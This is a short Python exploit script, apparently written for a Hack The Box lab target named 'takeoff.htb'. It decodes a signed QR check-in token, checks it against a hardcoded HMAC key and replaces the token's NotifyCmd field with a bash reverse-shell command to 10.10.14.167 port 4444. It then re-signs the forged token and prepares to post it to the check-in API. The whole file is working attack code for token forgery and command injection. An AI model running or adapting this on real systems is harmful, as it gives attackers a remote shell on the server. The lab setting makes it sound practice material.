import base64, hmac, hashlib, re, html, requests

KEY = b'JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR'
COOKIE = "YOUR_SESSION_TOKEN"

# Grab the legitimate QR code
#t = requests.get(
#    "http://takeoff.htb/check-in",
#    cookies={"session_token": COOKIE}
#).text
#
#qr_b64 = html.unescape(
#    re.search(r'name="qr_data"\s+value="([^"]+)"', t).group(1)
#)


qr_b64="ThAAHSpnb2IuVmVyaWZ5VGlja2V0QXV0aGVudGljaXR5fwMBARhWZXJpZnlUaWNrZXRBdXRoZW50aWNpdHkB/4AAAQEBBERhdGEBCgAAAP+i/4D/ngH/mnsiUE5SIjoiM1JaWTU0IiwiVG9rZW4iOiI0NjNkYWRmYjhhZTZkMzA4ZGJkZGJlNDliMjM1MGZkMSIsIlNlYXQiOiIxQiIsIlBhc3NlbmdlciI6IjEyMyIsIk5vdGlmeUNtZCI6ImNoZWNrLWluLW5vdGlmeSAtLXBuciAzUlpZNTQgLS1lbWFpbCB6ekBnb29nbGUuY29tIn0AouoECiDLPGw/mUCRTFcSC+T5gWhZxrzaKVUxX7KKzWg="



raw = base64.b64decode(qr_b64)
gob, sig = raw[:-32], raw[-32:]

#print(raw, "\n\n\n\n")

# Verify the HMAC key
assert hmac.new(KEY, gob, hashlib.sha256).digest() == sig

#print(gob, "\n\n\n", sig, "\n\n\n")

# Find the NotifyCmd field
marker = b'"NotifyCmd":"'
idx = gob.find(marker)
start = idx + len(marker)
end = gob.find(b'"', start)

orig = gob[start:end]

# Reverse shell command
cmd = b'bash -i >& /dev/tcp/10.10.14.167/4444 0>&1'

# Pad the command to match the original length
cmd = cmd + b' ' * (len(orig) - len(cmd))

# Replace the original command
forged = gob[:start] + cmd + gob[end:]

# Generate a new HMAC signature
new_sig = hmac.new(KEY, forged, hashlib.sha256).digest()

#print(forged, "\n\n\n\n\n", new_sig.hex())

payload = base64.b64encode(forged + new_sig).decode()


# Send the modified QR code
#ir = requests.post(
#    "http://takeoff.htb/api/check-in",
#    data={"qr_data": payload, "gate": "WEB"},
#    allow_redirects=False
#)